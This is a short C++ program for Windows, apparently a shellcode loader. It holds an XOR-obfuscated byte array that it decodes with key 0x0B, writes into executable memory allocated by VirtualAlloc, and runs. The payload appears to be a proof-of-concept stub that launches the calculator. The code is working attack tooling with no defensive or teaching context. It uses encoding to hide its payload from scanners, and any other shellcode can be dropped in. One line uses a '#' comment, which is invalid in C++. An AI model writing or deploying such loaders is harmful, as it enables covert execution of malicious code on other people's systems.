
#include <iostream>
#include <Windows.h>
typedef void (*ShellcodeFunction)();

# Shellcode XOR encoding/decoding
VOID XorEncode(IN PBYTE pShellcode, IN SIZE_T ShellcodeSize, IN BYTE XorKey) {
    for (size_t i = 0; i < ShellcodeSize; i++) {
        pShellcode[i] = pShellcode[i] ^ XorKey;
    }
}
unsigned char Data_shellcode[] = {
0xF7, 0x43, 0x88, 0xEF, 0xFB, 0xE3, 0xCB, 0x0B, 0x0B, 0x0B, 0x4A, 0x5A, 0x4A, 0x5B, 0x59, 0x5A, 0x5D, 0x43, 0x3A, 0xD9, 0x6E, 0x43, 0x80, 0x59, 0x6B, 0x43, 0x80, 0x59, 0x13, 0x43, 0x80, 0x59, 0x2B, 0x43, 0x80, 0x79, 0x5B, 0x43, 0x04, 0xBC, 0x41, 0x41, 0x46, 0x3A, 0xC2, 0x43, 0x3A, 0xCB, 0xA7, 0x37, 0x6A, 0x77, 0x09, 0x27, 0x2B, 0x4A, 0xCA, 0xC2, 0x06, 0x4A, 0x0A, 0xCA, 0xE9, 0xE6, 0x59, 0x4A, 0x5A, 0x43, 0x80, 0x59, 0x2B, 0x80, 0x49, 0x37, 0x43, 0x0A, 0xDB, 0x80, 0x8B, 0x83, 0x0B, 0x0B, 0x0B, 0x43, 0x8E, 0xCB, 0x7F, 0x6C, 0x43, 0x0A, 0xDB, 0x5B, 0x80, 0x43, 0x13, 0x4F, 0x80, 0x4B, 0x2B, 0x42, 0x0A, 0xDB, 0xE8, 0x5D, 0x43, 0xF4, 0xC2, 0x4A, 0x80, 0x3F, 0x83, 0x43, 0x0A, 0xDD, 0x46, 0x3A, 0xC2, 0x43, 0x3A, 0xCB, 0xA7, 0x4A, 0xCA, 0xC2, 0x06, 0x4A, 0x0A, 0xCA, 0x33, 0xEB, 0x7E, 0xFA, 0x47, 0x08, 0x47, 0x2F, 0x03, 0x4E, 0x32, 0xDA, 0x7E, 0xD3, 0x53, 0x4F, 0x80, 0x4B, 0x2F, 0x42, 0x0A, 0xDB, 0x6D, 0x4A, 0x80, 0x07, 0x43, 0x4F, 0x80, 0x4B, 0x17, 0x42, 0x0A, 0xDB, 0x4A, 0x80, 0x0F, 0x83, 0x43, 0x0A, 0xDB, 0x4A, 0x53, 0x4A, 0x53, 0x55, 0x52, 0x51, 0x4A, 0x53, 0x4A, 0x52, 0x4A, 0x51, 0x43, 0x88, 0xE7, 0x2B, 0x4A, 0x59, 0xF4, 0xEB, 0x53, 0x4A, 0x52, 0x51, 0x43, 0x80, 0x19, 0xE2, 0x5C, 0xF4, 0xF4, 0xF4, 0x56, 0x43, 0xB1, 0x0A, 0x0B, 0x0B, 0x0B, 0x0B, 0x0B, 0x0B, 0x0B, 0x43, 0x86, 0x86, 0x0A, 0x0A, 0x0B, 0x0B, 0x4A, 0xB1, 0x3A, 0x80, 0x64, 0x8C, 0xF4, 0xDE, 0xB0, 0xEB, 0x16, 0x21, 0x01, 0x4A, 0xB1, 0xAD, 0x9E, 0xB6, 0x96, 0xF4, 0xDE, 0x43, 0x88, 0xCF, 0x23, 0x37, 0x0D, 0x77, 0x01, 0x8B, 0xF0, 0xEB, 0x7E, 0x0E, 0xB0, 0x4C, 0x18, 0x79, 0x64, 0x61, 0x0B, 0x52, 0x4A, 0x82, 0xD1, 0xF4, 0xDE, 0x68, 0x6A, 0x67, 0x68, 0x0B
};


int main()
{
    int sShellcodeSize = sizeof(Data_shellcode) / sizeof(Data_shellcode[0]);

    XorEncode(Data_shellcode, sShellcodeSize, 0xb);

    LPVOID pAllocateMemory = VirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pAllocateMemory == NULL) {
        return -1;
    }
    memcpy(pAllocateMemory, Data_shellcode, sShellcodeSize);
    ShellcodeFunction pShellcodeFunction = reinterpret_cast<ShellcodeFunction>(pAllocateMemory);


    pShellcodeFunction();

  
    VirtualFree(pAllocateMemory, 0, MEM_RELEASE);


    return 0;
}

